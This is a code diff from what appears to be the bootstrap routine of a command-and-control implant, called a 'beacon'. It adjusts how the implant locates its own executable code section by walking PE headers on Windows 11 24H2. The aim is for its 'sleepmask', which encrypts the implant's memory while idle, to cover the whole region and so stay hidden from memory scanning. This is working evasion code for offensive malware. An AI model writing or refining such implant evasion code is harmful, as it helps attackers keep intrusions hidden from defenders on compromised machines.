@@ -407,13 +407,38 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     }
     NaxDbgx( Nax, "user32=%p gdi32=%p", hUser32, hGdi32 );
 
-    /* Record beacon .text region for sleepmask encryption */
+    /* Record beacon .text region for sleepmask encryption.
+     * Win11 24H2 can split a section view into multiple memory regions,
+     * making NtQueryVirtualMemory RegionSize < .text SizeOfRawData.
+     * Walk PE headers from AllocationBase to get the true bounds so
+     * VirtualProtect covers the entire range the sleepmask writes to. */
     if ( Nax->Ntdll.NtQueryVirtualMemory ) {
         MEMORY_BASIC_INFORMATION mbi;
         MmZero( &mbi, sizeof( mbi ) );
         if ( Nax->Ntdll.NtQueryVirtualMemory( NtCurrentProcess(), (PVOID)NaxBootstrap, 0, &mbi, sizeof( mbi ), NULL ) == 0 ) {
             Nax->SmInfo.BeaconBase = mbi.BaseAddress;
             Nax->SmInfo.BeaconSize = (UINT32)mbi.RegionSize;
+
+            if ( mbi.Type == MEM_IMAGE && mbi.AllocationBase ) {
+                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mbi.AllocationBase;
+                if ( dos->e_magic == IMAGE_DOS_SIGNATURE ) {
+                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)( (PBYTE)mbi.AllocationBase + dos->e_lfanew );
+                    if ( nt->Signature == IMAGE_NT_SIGNATURE ) {
+                        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( nt );
+                        DWORD chars = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE;
+                        for ( UINT16 i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
+                            if ( ( sec[i].Characteristics & chars ) == chars ) {
+                                Nax->SmInfo.BeaconBase = (PVOID)( (PBYTE)mbi.AllocationBase + sec[i].VirtualAddress );
+                                Nax->SmInfo.BeaconSize = sec[i].SizeOfRawData;
+                                if ( !Nax->SmInfo.BeaconSize )
+                                    Nax->SmInfo.BeaconSize = sec[i].Misc.VirtualSize;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
             NaxDbgx( Nax, "beacon region: base=%p size=0x%x", Nax->SmInfo.BeaconBase, Nax->SmInfo.BeaconSize );
         }
     }
